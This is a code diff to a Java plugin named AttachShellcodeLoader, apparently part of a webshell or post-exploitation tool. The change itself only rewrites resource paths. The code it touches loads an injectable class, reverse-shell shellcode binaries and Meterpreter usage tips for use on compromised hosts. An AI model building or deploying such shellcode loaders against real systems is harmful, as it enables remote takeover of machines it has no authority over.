@@ -111,7 +111,7 @@ public class AttachShellcodeLoader implements Plugin {
     private void loadButtonClick(ActionEvent actionEvent) {
         if (!this.loadState) {
             try {
-                InputStream inputStream = getClass().getResourceAsStream("assets/AttachShellcodeLoader.classs");
+                InputStream inputStream = getClass().getClassLoader().getResourceAsStream("shell/java/assets/AttachShellcodeLoader.classs");
                 byte[] data = functions.readInputStream(inputStream);
                 inputStream.close();
                 if (this.payload.include(CLASS_NAME, data)) {
@@ -175,7 +175,7 @@ public class AttachShellcodeLoader implements Plugin {
             Class<?> cls = getClass();
             Object[] objArr = new Object[1];
             objArr[0] = is64 ? "64" : "";
-            InputStream inputStream = cls.getResourceAsStream(String.format("assets/reverse%s.bin", objArr));
+            InputStream inputStream = cls.getClassLoader().getResourceAsStream(String.format("shell/java/assets/reverse%s.bin", objArr));
             String shellcodeHex2 = new String(functions.readInputStream(inputStream));
             try {
                 inputStream.close();
@@ -198,7 +198,7 @@ public class AttachShellcodeLoader implements Plugin {
     private void updateMeterpreterTip() {
         try {
             boolean is64 = this.is64CheckBox.isSelected();
-            InputStream inputStream = getClass().getResourceAsStream("assets/meterpreterTip2.txt");
+            InputStream inputStream = getClass().getClassLoader().getResourceAsStream("shell/java/assets/meterpreterTip2.txt");
             String tipString = new String(functions.readInputStream(inputStream));
             inputStream.close();
             this.tipTextArea.setText(tipString.replace("{arch}", is64 ? "/x64" : ""));
